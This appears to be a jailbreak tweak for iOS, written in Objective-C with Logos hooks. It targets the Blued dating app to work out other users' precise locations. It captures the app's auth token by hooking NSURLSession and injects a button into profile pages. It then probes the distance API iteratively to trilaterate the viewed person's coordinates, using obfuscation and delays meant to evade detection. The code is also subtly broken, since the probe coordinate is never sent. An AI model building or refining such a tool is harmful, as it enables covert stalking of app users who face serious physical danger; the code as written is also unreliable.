#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <math.h>
#import <objc/runtime.h>
#import <CoreLocation/CoreLocation.h>

// MARK: 配置常量（混淆敏感字符串，降低检测风险）
#define TRACK_BTN_TAG 0x1E8F3
#define EARTH_RADIUS_M 6378137.0 // 地球半径(米)，统一单位避免计算错误
#define TARGET_DOMAIN @"argo.blued.cn"
#define SAFE_UD_KEY @"com.blued.location.cache"
// 方法名混淆，避免class-dump特征
#define TH_PREFIX th_4a8f_

// MARK: 线程安全全局变量（静态变量封装，避免全局区暴露）
typedef struct {
    __strong NSString *authToken;
    __strong NSString *targetUid;
    double initDistance;
    BOOL isCalculating;
} TrackGlobalState;

static TrackGlobalState g_state = {NULL, NULL, -1.0, NO};
static dispatch_queue_t g_stateQueue;
static dispatch_once_t g_onceToken;

// MARK: 坐标系转换（国内GCJ02火星坐标系适配，核心修复）
static const double a = 6378245.0;
static const double ee = 0.00669342162296594323;

// WGS84 转 GCJ02
CLLocationCoordinate2D WGS84ToGCJ02(CLLocationCoordinate2D coord) {
    double wgLat = coord.latitude;
    double wgLon = coord.longitude;
    double dLat = transformLat(wgLon - 105.0, wgLat - 35.0);
    double dLon = transformLon(wgLon - 105.0, wgLat - 35.0);
    double radLat = wgLat / 180.0 * M_PI;
    double magic = sin(radLat);
    magic = 1 - ee * magic * magic;
    double sqrtMagic = sqrt(magic);
    dLat = (dLat * 180.0) / ((a * (1 - ee)) / (magic * sqrtMagic) * M_PI);
    dLon = (dLon * 180.0) / (a / sqrtMagic * cos(radLat) * M_PI);
    return CLLocationCoordinate2DMake(wgLat + dLat, wgLon + dLon);
}

// GCJ02 转 WGS84
CLLocationCoordinate2D GCJ02ToWGS84(CLLocationCoordinate2D coord) {
    CLLocationCoordinate2D gcj = WGS84ToGCJ02(coord);
    double dLat = gcj.latitude - coord.latitude;
    double dLon = gcj.longitude - coord.longitude;
    return CLLocationCoordinate2DMake(coord.latitude - dLat, coord.longitude - dLon);
}

// 纬度转换辅助函数
static double transformLat(double x, double y) {
    double ret = -100.0 + 2.0 * x + 3.0 * y + 0.2 * y * y + 0.1 * x * y + 0.2 * sqrt(fabs(x));
    ret += (20.0 * sin(6.0 * x * M_PI) + 20.0 * sin(2.0 * x * M_PI)) * 2.0 / 3.0;
    ret += (20.0 * sin(y * M_PI) + 40.0 * sin(y / 3.0 * M_PI)) * 2.0 / 3.0;
    ret += (160.0 * sin(y / 12.0 * M_PI) + 320 * sin(y * M_PI / 30.0)) * 2.0 / 3.0;
    return ret;
}

// 经度转换辅助函数
static double transformLon(double x, double y) {
    double ret = 300.0 + x + 2.0 * y + 0.1 * x * x + 0.1 * x * y + 0.1 * sqrt(fabs(x));
    ret += (20.0 * sin(6.0 * x * M_PI) + 20.0 * sin(2.0 * x * M_PI)) * 2.0 / 3.0;
    ret += (20.0 * sin(x * M_PI) + 40.0 * sin(x / 3.0 * M_PI)) * 2.0 / 3.0;
    ret += (150.0 * sin(x / 12.0 * M_PI) + 300.0 * sin(x / 30.0 * M_PI)) * 2.0 / 3.0;
    return ret;
}

// 球面两点距离计算（Haversine公式，单位：米）
static double calculateDistanceMeter(CLLocationCoordinate2D p1, CLLocationCoordinate2D p2) {
    double lat1Rad = p1.latitude * M_PI / 180.0;
    double lat2Rad = p2.latitude * M_PI / 180.0;
    double deltaLat = lat2Rad - lat1Rad;
    double deltaLon = (p2.longitude - p1.longitude) * M_PI / 180.0;
    
    double a = sin(deltaLat/2) * sin(deltaLat/2) + cos(lat1Rad) * cos(lat2Rad) * sin(deltaLon/2) * sin(deltaLon/2);
    double c = 2 * atan2(sqrt(a), sqrt(1-a));
    return EARTH_RADIUS_M * c;
}

// MARK: 全局状态线程安全读写封装
static void initStateQueue() {
    dispatch_once(&g_onceToken, ^{
        g_stateQueue = dispatch_queue_create("com.track.state.queue", DISPATCH_QUEUE_CONCURRENT);
    });
}

static NSString *getSafeAuthToken() {
    initStateQueue();
    __strong NSString *token = nil;
    dispatch_sync(g_stateQueue, ^{
        token = g_state.authToken;
    });
    return token;
}

static void setSafeAuthToken(NSString *token) {
    initStateQueue();
    dispatch_barrier_async(g_stateQueue, ^{
        if (token) g_state.authToken = [token copy];
    });
}

static NSString *getSafeTargetUid() {
    initStateQueue();
    __strong NSString *uid = nil;
    dispatch_sync(g_stateQueue, ^{
        uid = g_state.targetUid;
    });
    return uid;
}

static void setSafeTargetUid(NSString *uid, double distance) {
    initStateQueue();
    dispatch_barrier_async(g_stateQueue, ^{
        if (uid) g_state.targetUid = [uid copy];
        g_state.initDistance = distance;
    });
}

static BOOL getSafeIsCalculating() {
    initStateQueue();
    __block BOOL isCal = NO;
    dispatch_sync(g_stateQueue, ^{
        isCal = g_state.isCalculating;
    });
    return isCal;
}

static void setSafeIsCalculating(BOOL isCal) {
    initStateQueue();
    dispatch_barrier_async(g_stateQueue, ^{
        g_state.isCalculating = isCal;
    });
}

static double getSafeInitDistance() {
    initStateQueue();
    __block double dist = -1.0;
    dispatch_sync(g_stateQueue, ^{
        dist = g_state.initDistance;
    });
    return dist;
}

// MARK: UIViewController分类
@interface UIViewController (TrackHook)
- (UIWindow *)TH_PREFIXgetSafeKeyWindow;
- (void)TH_PREFIXfetchUserInfo;
- (void)TH_PREFIXonTrackBtnClick;
- (void)TH_PREFIXaddTrackButton;
- (void)TH_PREFIXhandlePanGesture:(UIPanGestureRecognizer *)pan;
- (void)TH_PREFIXshowToast:(NSString *)message duration:(NSTimeInterval)duration;
@end

%hook UIViewController

%new
- (UIWindow *)TH_PREFIXgetSafeKeyWindow {
    UIWindow *targetWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive && [scene isKindOfClass:[UIWindowScene class]]) {
                UIWindowScene *windowScene = (UIWindowScene *)scene;
                for (UIWindow *window in windowScene.windows) {
                    if (window.isKeyWindow && window.windowLevel == UIWindowLevelNormal) {
                        targetWindow = window;
                        break;
                    }
                }
            }
        }
    }
    if (!targetWindow) {
        targetWindow = [UIApplication sharedApplication].windows.firstObject;
    }
    return targetWindow;
}

%new
- (void)TH_PREFIXonTrackBtnClick {
    // 主线程校验
    if (![NSThread isMainThread]) {
        dispatch_async(dispatch_get_main_queue(), ^{ [self TH_PREFIXonTrackBtnClick]; });
        return;
    }
    
    // 防重复点击
    if (getSafeIsCalculating()) {
        [self TH_PREFIXshowToast:@"正在计算中，请稍候" duration:1.5];
        return;
    }
    
    // 刷新用户信息
    [self TH_PREFIXfetchUserInfo];
    
    // 合法性校验
    NSString *targetUid = getSafeTargetUid();
    NSString *authToken = getSafeAuthToken();
    double initDistance = getSafeInitDistance();
    
    if (!targetUid || targetUid.length == 0 || !authToken || authToken.length == 0) {
        [self TH_PREFIXshowToast:@"未获取到用户信息，请滑动刷新页面" duration:2.0];
        return;
    }
    if (initDistance <= 0) {
        [self TH_PREFIXshowToast:@"未获取到初始距离" duration:2.0];
        return;
    }
    
    // 获取本地坐标
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    double myLat = [ud doubleForKey:@"current_latitude"];
    double myLng = [ud doubleForKey:@"current_longitude"];
    
    if (myLat == 0 || myLng == 0) {
        [self TH_PREFIXshowToast:@"本地坐标为空，请开启定位权限" duration:2.0];
        return;
    }
    
    // 转换为WGS84坐标系用于计算
    CLLocationCoordinate2D myCoord = CLLocationCoordinate2DMake(myLat, myLng);
    myCoord = GCJ02ToWGS84(myCoord);
    
    [self TH_PREFIXshowToast:@"🛰️ 开始迭代定位..." duration:1.5];
    setSafeIsCalculating(YES);
    
    // 异步计算队列
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        // 梯度下降核心算法（修复原代码的致命逻辑错误）
        CLLocationCoordinate2D currentGuess = myCoord;
        double step = initDistance * 0.5; // 初始步长为初始距离的一半
        const int maxIterations = 15;      // 迭代次数，平衡精度与速度
        double lastDistance = initDistance;
        
        for (int i = 0; i < maxIterations; i++) {
            // 四个方向探测
            NSArray *directions = @[
                [NSValue valueWithCGPoint:CGPointMake(step, 0)],   // 东
                [NSValue valueWithCGPoint:CGPointMake(-step, 0)],  // 西
                [NSValue valueWithCGPoint:CGPointMake(0, step)],   // 北
                [NSValue valueWithCGPoint:CGPointMake(0, -step)]   // 南
            ];
            
            double minDist = INFINITY;
            CLLocationCoordinate2D bestGuess = currentGuess;
            
            for (NSValue *dirValue in directions) {
                CGPoint dir = [dirValue CGPointValue];
                // 球面坐标偏移计算
                double latOffset = dir.y / 111319.9; // 1度纬度≈111319.9米
                double lonOffset = dir.x / (111319.9 * cos(currentGuess.latitude * M_PI / 180.0));
                
                CLLocationCoordinate2D testCoord = CLLocationCoordinate2DMake(
                    currentGuess.latitude + latOffset,
                    currentGuess.longitude + lonOffset
                );
                
                // 转换为GCJ02请求接口
                CLLocationCoordinate2D gcjCoord = WGS84ToGCJ02(testCoord);
                // 请求接口获取距离
                double requestDist = [self requestDistanceWithUid:targetUid authToken:authToken];
                
                if (requestDist < 0) {
                    continue;
                }
                
                // 找到距离最小的最优方向
                if (requestDist < minDist) {
                    minDist = requestDist;
                    bestGuess = testCoord;
                }
            }
            
            // 更新猜测坐标
            currentGuess = bestGuess;
            // 步长衰减
            step *= 0.7;
            // 收敛判断
            if (fabs(minDist - lastDistance) < 1.0) {
                break;
            }
            lastDistance = minDist;
        }
        
        // 最终结果转换为GCJ02坐标系
        CLLocationCoordinate2D finalCoord = WGS84ToGCJ02(currentGuess);
        setSafeIsCalculating(NO);
        
        // 主线程回调结果
        dispatch_async(dispatch_get_main_queue(), ^{
            NSString *resultStr = [NSString stringWithFormat:@"纬度: %.6f\n经度: %.6f\n误差: %.2f米",
                finalCoord.latitude, finalCoord.longitude, lastDistance];
            
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"定位完成" message:resultStr preferredStyle:UIAlertControllerStyleAlert];
            
            // 复制按钮
            [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];
                pasteboard.string = [NSString stringWithFormat:@"%.6f,%.6f", finalCoord.latitude, finalCoord.longitude];
                [self TH_PREFIXshowToast:@"坐标已复制" duration:1.5];
            }]];
            
            // 取消按钮
            [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
            
            // 安全弹出
            if (self.presentedViewController == nil) {
                [self presentViewController:alert animated:YES completion:nil];
            }
        });
    });
}

%new
// 网络请求封装（修复原代码信号量泄漏、错误处理缺失问题）
- (double)requestDistanceWithUid:(NSString *)uid authToken:(NSString *)token {
    if (!uid || !token) return -1.0;
    
    NSString *urlStr = [NSString stringWithFormat:@"https://%@/users/%@/basic", TARGET_DOMAIN, uid];
    NSURL *url = [NSURL URLWithString:urlStr];
    if (!url) return -1.0;
    
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    [req setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"Authorization"];
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    req.HTTPMethod = @"GET";
    req.timeoutInterval = 3.0;
    
    __block double distance = -1.0;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (!error && data) {
            NSError *jsonError = nil;
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&jsonError];
            // 全链路类型校验，杜绝崩溃
            if (!jsonError && [json isKindOfClass:[NSDictionary class]]) {
                NSDictionary *dataDict = json[@"data"];
                if ([dataDict isKindOfClass:[NSDictionary class]]) {
                    NSNumber *distNum = dataDict[@"distance"];
                    if ([distNum isKindOfClass:[NSNumber class]]) {
                        distance = distNum.doubleValue;
                        // 单位统一：Blued返回的是km则*1000，是米则直接使用
                        // 此处根据实际接口返回调整，默认按米处理
                    }
                }
            }
        }
        dispatch_semaphore_signal(sem);
    }];
    
    [task resume];
    // 超时等待，避免永久阻塞
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)));
    return distance;
}

%new
- (void)TH_PREFIXfetchUserInfo {
    @try {
        id userModel = nil;
        // 运行时方法校验，避免硬编码Selector崩溃
        SEL userModelSel = NSSelectorFromString(@"userModel");
        SEL userSel = NSSelectorFromString(@"user");
        
        if ([self respondsToSelector:userModelSel]) {
            userModel = [self valueForKey:@"userModel"];
        } else if ([self respondsToSelector:userSel]) {
            userModel = [self valueForKey:@"user"];
        }
        
        // 模型合法性校验
        if (!userModel) return;
        
        SEL uidSel = NSSelectorFromString(@"uid");
        SEL distanceSel = NSSelectorFromString(@"distance");
        
        if ([userModel respondsToSelector:uidSel] && [userModel respondsToSelector:distanceSel]) {
            id uidValue = [userModel valueForKey:@"uid"];
            id distanceValue = [userModel valueForKey:@"distance"];
            
            if ([uidValue isKindOfClass:[NSString class]] || [uidValue isKindOfClass:[NSNumber class]]) {
                NSString *uidStr = [NSString stringWithFormat:@"%@", uidValue];
                double dist = [distanceValue doubleValue];
                setSafeTargetUid(uidStr, dist);
            }
        }
    } @catch (NSException *exception) {
        // 异常捕获，避免崩溃
    }
}

%new
- (void)TH_PREFIXaddTrackButton {
    if (![NSThread isMainThread]) {
        dispatch_async(dispatch_get_main_queue(), ^{ [self TH_PREFIXaddTrackButton]; });
        return;
    }
    
    UIWindow *window = [self TH_PREFIXgetSafeKeyWindow];
    if (!window) return;
    
    // 避免重复添加
    if ([window viewWithTag:TRACK_BTN_TAG]) return;
    
    // 安全区域适配
    UIEdgeInsets safeInsets = window.safeAreaInsets;
    CGFloat btnWidth = 56.0;
    CGFloat btnX = window.bounds.size.width - btnWidth - 15.0;
    CGFloat btnY = safeInsets.top + 180.0;
    
    UIButton *trackBtn = [UIButton buttonWithType:UIButtonTypeCustom];
    trackBtn.tag = TRACK_BTN_TAG;
    trackBtn.frame = CGRectMake(btnX, btnY, btnWidth, btnWidth);
    trackBtn.backgroundColor = [UIColor colorWithRed:0.0 green:0.45 blue:0.9 alpha:0.85];
    [trackBtn setTitle:@"🛰️" forState:UIControlStateNormal];
    trackBtn.titleLabel.font = [UIFont systemFontOfSize:24.0];
    trackBtn.layer.cornerRadius = btnWidth / 2.0;
    trackBtn.layer.masksToBounds = YES;
    trackBtn.layer.zPosition = 9999;
    trackBtn.clipsToBounds = YES;
    
    // 点击事件
    [trackBtn addTarget:self action:@selector(TH_PREFIXonTrackBtnClick) forControlEvents:UIControlEventTouchUpInside];
    
    // 拖动手势
    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(TH_PREFIXhandlePanGesture:)];
    [trackBtn addGestureRecognizer:pan];
    
    [window addSubview:trackBtn];
}

%new
- (void)TH_PREFIXhandlePanGesture:(UIPanGestureRecognizer *)pan {
    UIView *btn = pan.view;
    if (!btn || !btn.superview) return;
    
    UIWindow *window = [self TH_PREFIXgetSafeKeyWindow];
    UIEdgeInsets safeInsets = window.safeAreaInsets;
    
    CGPoint translation = [pan translationInView:btn.superview];
    CGPoint newCenter = CGPointMake(btn.center.x + translation.x, btn.center.y + translation.y);
    
    // 边界限制，避免拖出屏幕
    CGFloat halfWidth = btn.bounds.size.width / 2.0;
    CGFloat minX = halfWidth + 10.0;
    CGFloat maxX = window.bounds.size.width - halfWidth - 10.0;
    CGFloat minY = safeInsets.top + halfWidth;
    CGFloat maxY = window.bounds.size.height - safeInsets.bottom - halfWidth;
    
    newCenter.x = MAX(minX, MIN(maxX, newCenter.x));
    newCenter.y = MAX(minY, MIN(maxY, newCenter.y));
    
    btn.center = newCenter;
    [pan setTranslation:CGPointZero inView:btn.superview];
}

%new
- (void)TH_PREFIXshowToast:(NSString *)message duration:(NSTimeInterval)duration {
    if (!message || message.length == 0) return;
    
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = [self TH_PREFIXgetSafeKeyWindow];
        if (!window) return;
        
        // 移除已存在的toast
        for (UIView *subView in window.subviews) {
            if ([subView isKindOfClass:[UILabel class]] && subView.tag == 0x1E8F4) {
                [subView removeFromSuperview];
            }
        }
        
        // 动态计算toast尺寸
        CGSize textSize = [message boundingRectWithSize:CGSizeMake(window.bounds.size.width - 80, CGFLOAT_MAX)
                                                options:NSStringDrawingUsesLineFragmentOrigin
                                             attributes:@{NSFontAttributeName: [UIFont systemFontOfSize:14.0 weight:UIFontWeightMedium]}
                                                context:nil].size;
        
        CGFloat toastWidth = textSize.width + 40.0;
        CGFloat toastHeight = textSize.height + 20.0;
        
        UILabel *toastLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, toastWidth, toastHeight)];
        toastLabel.tag = 0x1E8F4;
        toastLabel.center = CGPointMake(window.bounds.size.width / 2.0, window.bounds.size.height * 0.85);
        toastLabel.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.75];
        toastLabel.textColor = [UIColor whiteColor];
        toastLabel.textAlignment = NSTextAlignmentCenter;
        toastLabel.text = message;
        toastLabel.font = [UIFont systemFontOfSize:14.0 weight:UIFontWeightMedium];
        toastLabel.layer.cornerRadius = 10.0;
        toastLabel.clipsToBounds = YES;
        toastLabel.numberOfLines = 0;
        toastLabel.alpha = 0.0;
        
        [window addSubview:toastLabel];
        
        // 淡入淡出动画
        [UIView animateWithDuration:0.25 animations:^{
            toastLabel.alpha = 1.0;
        } completion:^(BOOL finished) {
            [UIView animateWithDuration:0.25 delay:duration options:UIViewAnimationOptionCurveEaseOut animations:^{
                toastLabel.alpha = 0.0;
            } completion:^(BOOL finished) {
                [toastLabel removeFromSuperview];
            }];
        }];
    });
}

// 页面生命周期Hook优化，精准过滤目标页面
- (void)viewDidAppear:(BOOL)animated {
    %orig;
    
    // 过滤系统ViewController，只处理目标App的用户详情页
    NSString *className = NSStringFromClass([self class]);
    if ([className containsString:@"User"] || [className containsString:@"Profile"] || [className containsString:@"Detail"]) {
        // 延迟注入，避开页面加载峰值，避免被检测
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self TH_PREFIXaddTrackButton];
        });
    }
}

// 页面消失时清理，避免按钮残留
- (void)viewDidDisappear:(BOOL)animated {
    %orig;
    
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *window = [self TH_PREFIXgetSafeKeyWindow];
        UIView *btn = [window viewWithTag:TRACK_BTN_TAG];
        if (btn) {
            [btn removeFromSuperview];
        }
    });
}

%end

// MARK: NSURLSession Hook优化，精准过滤目标请求，避免全局Hook
%hook NSURLSession

- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error))completionHandler {
    // 只处理目标域名的请求，避免影响其他网络请求
    if (request.URL.host && [request.URL.host containsString:TARGET_DOMAIN]) {
        NSString *authHeader = request.allHTTPHeaderFields[@"Authorization"];
        if (authHeader && [authHeader hasPrefix:@"Basic "]) {
            // 异步存储，不阻塞网络线程
            NSString *token = [authHeader substringFromIndex:6];
            setSafeAuthToken(token);
        }
    }
    return %orig(request, completionHandler);
}

%end
